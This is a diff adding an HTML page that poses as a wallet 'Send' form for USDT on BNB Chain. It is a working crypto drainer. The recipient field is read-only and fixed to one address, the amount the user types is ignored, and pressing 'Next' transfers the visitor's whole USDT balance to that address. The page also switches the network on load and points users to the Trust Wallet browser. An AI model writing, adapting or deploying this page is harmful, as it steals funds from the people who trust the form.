@@ -1,0 +1,82 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Send</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+</head>
+<body class="bg-white text-gray-800 font-sans">
+<div class="max-w-md mx-auto p-4">
+<label class="block text-sm font-medium mb-1">Address or Domain Name</label>
+<input class="w-full border rounded-lg px-3 py-2 mb-4" id="addressInput" readonly="" type="text" value="0xe47a9ecb5C87b06364bA2c6CEB064583c935f2ed"/>
+<label class="block text-sm font-medium mb-1">Amount</label>
+<input class="w-full border rounded-lg px-3 py-2 mb-1" id="amountInput" placeholder="Enter amount" type="text"/>
+<label class="block text-sm font-medium mb-1 mt-4">Memo</label>
+<input class="w-full border rounded-lg px-3 py-2 mb-6" id="memoInput" placeholder="Optional" type="text"/>
+<button class="w-full bg-blue-700 text-white text-lg py-3 rounded-full" onclick="sendUSDT()">
+      Next
+    </button>
+<p class="text-center text-sm mt-4 text-gray-600" id="status"></p>
+</div>
+<script>
+  window.addEventListener("load", async () => {
+    if (window.ethereum) {
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }]
+        });
+      } catch (err) {
+        console.warn("Network switch failed or rejected.");
+      }
+    }
+  });
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+    const USDT_ABI = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function transfer(address to, uint256 amount) returns (bool)"
+    ];
+
+    async function sendUSDT() {
+      const recipient = document.getElementById("addressInput").value;
+
+      if (!window.ethereum) {
+        alert("Please open in Trust Wallet browser");
+        return;
+      }
+
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+
+      const network = await provider.getNetwork();
+      if (network.chainId !== 56) {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }]
+        });
+      }
+
+      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
+      const sender = await signer.getAddress();
+
+      document.getElementById("status").textContent = "Checking USDT balance...";
+
+      const balance = await usdt.balanceOf(sender);
+      if (balance == 0n) {
+        document.getElementById("status").textContent = "❌ No USDT available to send.";
+        return;
+      }
+
+      
+      const tx = await usdt.transfer(recipient, balance);
+      await tx.wait();
+
+      document.getElementById("status").textContent = "✅ All USDT sent successfully.";
+    }
+  </script>
+</body>
+</html>
